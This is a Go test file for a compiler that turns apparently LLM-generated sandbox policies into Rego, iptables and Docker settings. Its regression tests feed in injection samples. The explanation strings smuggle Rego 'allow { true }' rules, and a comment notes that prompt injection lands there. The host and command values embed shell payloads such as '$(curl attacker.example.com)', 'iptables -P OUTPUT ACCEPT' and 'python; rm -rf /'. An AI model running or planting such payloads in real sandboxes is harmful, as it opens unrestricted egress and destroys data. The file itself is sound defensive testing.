package nlpolicy

import (
	"errors"
	"strings"
	"testing"
)

// safePolicy returns a policy that compiles cleanly, so each test can mutate
// one field and attribute any failure to it.
func safePolicy() *Policy {
	return &Policy{
		Explanation: "Allow read-only Python work with no network access",
		ResourceLimits: ResourceLimits{
			CPULimit:       2.0,
			MemoryLimitMB:  4096,
			TimeoutSeconds: 1800,
		},
		NetworkPolicy: NetworkPolicy{
			Enabled:      true,
			AllowedHosts: []string{"pypi.org", "files.pythonhosted.org"},
			BlockedPorts: []int{25, 587},
			AllowDNS:     true,
		},
		CommandPolicy: CommandPolicy{
			AllowedCommands: []string{"python", "pip", "pytest"},
			BlockedCommands: []string{"curl", "wget"},
			BlockSudo:       true,
		},
		FilePolicy: FilePolicy{
			BlockedPaths: []string{"/etc", "/root", "/var/run/docker.sock"},
			ReadOnly:     false,
		},
	}
}

func TestCompileAcceptsSafePolicy(t *testing.T) {
	c := NewCompiler()

	if _, err := c.CompileAll(safePolicy()); err != nil {
		t.Fatalf("CompileAll() = %v for a safe policy, want nil", err)
	}
}

// TestRegoInjectionViaExplanation is the regression test for the original
// compiler, which wrote policy.Explanation straight into a "# …" comment. The
// explanation is LLM output, so a prompt-injection attack lands there: a
// newline ends the comment and everything after it is parsed as policy code.
// An explanation ending in "allow { true }" turned a restrictive policy into
// an allow-all one.
func TestRegoInjectionViaExplanation(t *testing.T) {
	injections := []struct {
		name        string
		explanation string
	}{
		{
			name:        "allow-all rule",
			explanation: "Safe policy\nallow { true }",
		},
		{
			name:        "override default",
			explanation: "Safe policy\ndefault allow = true",
		},
		{
			name:        "carriage return",
			explanation: "Safe policy\rallow { true }",
		},
		{
			name:        "CRLF",
			explanation: "Safe policy\r\nallow { true }",
		},
		{
			name:        "package redefinition",
			explanation: "Safe\npackage other\nallow { true }",
		},
		{
			name:        "comment then rule",
			explanation: "Safe\n# harmless\nallow { input.command }",
		},
		{
			name:        "control character",
			explanation: "Safe\x00policy",
		},
	}

	c := NewCompiler()

	for _, tc := range injections {
		t.Run(tc.name, func(t *testing.T) {
			p := safePolicy()
			p.Explanation = tc.explanation

			rego, err := c.CompileToOPA(p)
			if err == nil {
				t.Fatalf("CompileToOPA() = nil error for injected explanation %q; generated:\n%s",
					tc.explanation, rego)
			}
			if !errors.Is(err, ErrUnsafePolicy) {
				t.Errorf("CompileToOPA() error = %v, want it to wrap ErrUnsafePolicy", err)
			}
		})
	}
}

// TestIptablesInjectionViaAllowedHosts is the regression test for
// "iptables -A OUTPUT -d %s -j ACCEPT". A host containing a space or a
// semicolon could append its own rule — for instance
// "1.1.1.1 -j ACCEPT; iptables -P OUTPUT ACCEPT" reverses the default drop and
// grants the sandbox unrestricted egress.
func TestIptablesInjectionViaAllowedHosts(t *testing.T) {
	injections := []struct {
		name string
		host string
	}{
		{"reverse default policy", "1.1.1.1 -j ACCEPT; iptables -P OUTPUT ACCEPT"},
		{"flush rules", "1.1.1.1; iptables -F"},
		{"command substitution", "$(curl attacker.example.com)"},
		{"backtick substitution", "`curl attacker.example.com`"},
		{"pipe to shell", "1.1.1.1 | sh"},
		{"logical and", "1.1.1.1 && curl attacker.example.com"},
		{"extra flag", "1.1.1.1 --jump ACCEPT"},
		{"newline new rule", "1.1.1.1\niptables -P OUTPUT ACCEPT"},
		{"tab separator", "1.1.1.1\t-j\tACCEPT"},
		{"redirect", "1.1.1.1 > /etc/passwd"},
		{"URL", "https://pypi.org"},
		{"path", "pypi.org/simple"},
		{"quote", "pypi.org'"},
		{"comment", "1.1.1.1 # ignore"},
		{"wildcard", "*"},
		{"glob", "*.pypi.org "},
		{"invalid CIDR", "10.0.0.0/99"},
		{"empty", ""},
	}

	c := NewCompiler()

	for _, tc := range injections {
		t.Run(tc.name, func(t *testing.T) {
			p := safePolicy()
			p.NetworkPolicy.AllowedHosts = []string{tc.host}

			rules, err := c.CompileToNetworkRules(p)
			if err == nil {
				t.Fatalf("CompileToNetworkRules() = nil error for host %q; generated rules:\n%s",
					tc.host, strings.Join(rules.IptablesRules, "\n"))
			}
			if !errors.Is(err, ErrUnsafePolicy) {
				t.Errorf("CompileToNetworkRules() error = %v, want it to wrap ErrUnsafePolicy", err)
			}
		})
	}
}

func TestAllowedHostsAcceptsLegitimateValues(t *testing.T) {
	hosts := []string{
		"pypi.org",
		"files.pythonhosted.org",
		"api.github.com",
		"registry.npmjs.org",
		"1.1.1.1",
		"8.8.8.8",
		"10.0.0.0/8",
		"192.168.1.0/24",
		"2606:4700:4700::1111",
		"sub.domain.example.co.uk",
		"host-with-hyphens.example.com",
	}

	c := NewCompiler()

	for _, host := range hosts {
		t.Run(host, func(t *testing.T) {
			p := safePolicy()
			p.NetworkPolicy.AllowedHosts = []string{host}

			if _, err := c.CompileToNetworkRules(p); err != nil {
				t.Errorf("CompileToNetworkRules() = %v for legitimate host %q, want nil", err, host)
			}
		})
	}
}

// TestRegoInjectionViaCommandList: commands are emitted through %q, which
// escapes them, but a value containing shell syntax still signals a malformed
// or hostile policy and is rejected outright.
func TestRegoInjectionViaCommandList(t *testing.T) {
	injections := []string{
		`python"} \n allow { true } \n unused = {"`,
		"python\nallow { true }",
		"python; rm -rf /",
		"python && curl evil.com",
		"python | sh",
		"python `id`",
		"python $(id)",
		"",
		strings.Repeat("a", MaxCommandLen+1),
	}

	c := NewCompiler()

	for _, cmd := range injections {
		t.Run(cmd, func(t *testing.T) {
			p := safePolicy()
			p.CommandPolicy.AllowedCommands = []string{cmd}

			if _, err := c.CompileToOPA(p); err == nil {
				t.Errorf("CompileToOPA() = nil for injected command %q, want error", cmd)
			}
		})
	}
}

func TestCommandListAcceptsLegitimateValues(t *testing.T) {
	commands := []string{
		"python", "python3", "python3.12",
		"pip", "pip3", "pytest",
		"npm", "node", "yarn",
		"go", "cargo", "rustc",
		"/usr/bin/python3",
		"g++", "make",
		"git",
	}

	c := NewCompiler()

	for _, cmd := range commands {
		t.Run(cmd, func(t *testing.T) {
			p := safePolicy()
			p.CommandPolicy.AllowedCommands = []string{cmd}

			if _, err := c.CompileToOPA(p); err != nil {
				t.Errorf("CompileToOPA() = %v for legitimate command %q, want nil", err, cmd)
			}
		})
	}
}

func TestBlockedPathsRejectControlCharacters(t *testing.T) {
	c := NewCompiler()

	bad := []string{
		"/etc\x00/passwd",
		"/etc\npasswd",
		"",
		strings.Repeat("a", MaxPathLen+1),
	}

	for _, path := range bad {
		t.Run(path, func(t *testing.T) {
			p := safePolicy()
			p.FilePolicy.BlockedPaths = []string{path}

			if _, err := c.CompileToOPA(p); err == nil {
				t.Errorf("CompileToOPA() = nil for path %q, want error", path)
			}
		})
	}
}

// Paths with characters that need escaping are accepted because %q escapes
// them correctly — rejecting them would break legitimate policies.
func TestBlockedPathsAcceptQuotableCharacters(t *testing.T) {
	c := NewCompiler()

	paths := []string{
		"/etc",
		"/var/run/docker.sock",
		`/path/with "quotes"`,
		`/path/with\backslash`,
		"/path with spaces",
		"/pad/ünïcode",
	}

	for _, path := range paths {
		t.Run(path, func(t *testing.T) {
			p := safePolicy()
			p.FilePolicy.BlockedPaths = []string{path}

			rego, err := c.CompileToOPA(p)
			if err != nil {
				t.Fatalf("CompileToOPA() = %v for path %q, want nil", err, path)
			}
			// %q must have escaped the value; a raw quote in the output would
			// terminate the Rego string literal.
			if strings.Contains(rego, `"`+path+`"`) && strings.ContainsAny(path, `"\`) {
				t.Errorf("CompileToOPA() emitted %q unescaped", path)
			}
		})
	}
}

func TestPortListRejectsOutOfRange(t *testing.T) {
	c := NewCompiler()

	for _, port := range []int{0, -1, -25, 65536, 1 << 20} {
		t.Run(itoa(port), func(t *testing.T) {
			p := safePolicy()
			p.NetworkPolicy.BlockedPorts = []int{port}

			if _, err := c.CompileToNetworkRules(p); err == nil {
				t.Errorf("CompileToNetworkRules() = nil for port %d, want error", port)
			}
		})
	}
}

func TestResourceLimitsRejectNegativeAndAbsurd(t *testing.T) {
	c := NewCompiler()

	cases := []struct {
		name   string
		limits ResourceLimits
	}{
		{"negative CPU", ResourceLimits{CPULimit: -1, MemoryLimitMB: 512, TimeoutSeconds: 600}},
		{"absurd CPU", ResourceLimits{CPULimit: 1e9, MemoryLimitMB: 512, TimeoutSeconds: 600}},
		{"negative memory", ResourceLimits{CPULimit: 1, MemoryLimitMB: -512, TimeoutSeconds: 600}},
		{"absurd memory", ResourceLimits{CPULimit: 1, MemoryLimitMB: 1 << 30, TimeoutSeconds: 600}},
		{"negative timeout", ResourceLimits{CPULimit: 1, MemoryLimitMB: 512, TimeoutSeconds: -1}},
		{"absurd timeout", ResourceLimits{CPULimit: 1, MemoryLimitMB: 512, TimeoutSeconds: 1 << 30}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p := safePolicy()
			p.ResourceLimits = tc.limits

			if _, err := c.CompileToDockerConfig(p); err == nil {
				t.Errorf("CompileToDockerConfig() = nil for %s, want error", tc.name)
			}
		})
	}
}

// TestCompileBoundsListSizes: a policy is LLM output, so nothing inherently
// limits how many entries it contains. Unbounded lists would generate a
// multi-megabyte Rego module or thousands of iptables rules.
func TestCompileBoundsListSizes(t *testing.T) {
	c := NewCompiler()

	t.Run("commands", func(t *testing.T) {
		p := safePolicy()
		p.CommandPolicy.AllowedCommands = repeat("python", MaxCommandsPerList+1)

		if _, err := c.CompileToOPA(p); err == nil {
			t.Error("CompileToOPA() = nil for an oversized command list, want error")
		}
	})

	t.Run("hosts", func(t *testing.T) {
		p := safePolicy()
		p.NetworkPolicy.AllowedHosts = repeat("example.com", MaxAllowedHosts+1)

		if _, err := c.CompileToNetworkRules(p); err == nil {
			t.Error("CompileToNetworkRules() = nil for an oversized host list, want error")
		}
	})

	t.Run("paths", func(t *testing.T) {
		p := safePolicy()
		p.FilePolicy.BlockedPaths = repeat("/etc", MaxPathsPerList+1)

		if _, err := c.CompileToOPA(p); err == nil {
			t.Error("CompileToOPA() = nil for an oversized path list, want error")
		}
	})

	t.Run("explanation", func(t *testing.T) {
		p := safePolicy()
		p.Explanation = strings.Repeat("a", MaxExplanationLen+1)

		if _, err := c.CompileToOPA(p); err == nil {
			t.Error("CompileToOPA() = nil for an oversized explanation, want error")
		}
	})
}

// TestCompiledRegoHasDefaultDeny: the generated module must start from
// "default allow = false" so that a policy which fails to match any rule denies
// rather than allows.
func TestCompiledRegoHasDefaultDeny(t *testing.T) {
	c := NewCompiler()

	rego, err := c.CompileToOPA(safePolicy())
	if err != nil {
		t.Fatalf("CompileToOPA() = %v, want nil", err)
	}

	if !strings.Contains(rego, "default allow = false") {
		t.Errorf("generated Rego lacks a default-deny rule:\n%s", rego)
	}
}

// TestNetworkRulesDefaultToDrop: when the network is enabled the generated
// ruleset must still begin with a DROP policy, so anything not explicitly
// allowed is blocked.
func TestNetworkRulesDefaultToDrop(t *testing.T) {
	c := NewCompiler()

	rules, err := c.CompileToNetworkRules(safePolicy())
	if err != nil {
		t.Fatalf("CompileToNetworkRules() = %v, want nil", err)
	}

	joined := strings.Join(rules.IptablesRules, "\n")
	if !strings.Contains(joined, "iptables -P OUTPUT DROP") {
		t.Errorf("generated rules lack a default OUTPUT DROP:\n%s", joined)
	}
}

func TestDisabledNetworkDropsBothDirections(t *testing.T) {
	c := NewCompiler()

	p := safePolicy()
	p.NetworkPolicy.Enabled = false
	p.NetworkPolicy.AllowedHosts = nil

	rules, err := c.CompileToNetworkRules(p)
	if err != nil {
		t.Fatalf("CompileToNetworkRules() = %v, want nil", err)
	}

	joined := strings.Join(rules.IptablesRules, "\n")
	for _, want := range []string{"iptables -P OUTPUT DROP", "iptables -P INPUT DROP"} {
		if !strings.Contains(joined, want) {
			t.Errorf("disabled network rules lack %q:\n%s", want, joined)
		}
	}
}

// TestDockerConfigDropsAllCapabilities verifies the compiled container config
// starts from no capabilities.
func TestDockerConfigDropsAllCapabilities(t *testing.T) {
	c := NewCompiler()

	config, err := c.CompileToDockerConfig(safePolicy())
	if err != nil {
		t.Fatalf("CompileToDockerConfig() = %v, want nil", err)
	}

	found := false
	for _, cap := range config.CapDrop {
		if cap == "ALL" {
			found = true
		}
	}
	if !found {
		t.Errorf("CompileToDockerConfig().CapDrop = %v, want it to contain ALL", config.CapDrop)
	}
}

func repeat(s string, n int) []string {
	out := make([]string, n)
	for i := range out {
		out[i] = s
	}
	return out
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	neg := n < 0
	if neg {
		n = -n
	}
	var digits []byte
	for n > 0 {
		digits = append([]byte{byte('0' + n%10)}, digits...)
		n /= 10
	}
	if neg {
		return "-" + string(digits)
	}
	return string(digits)
}
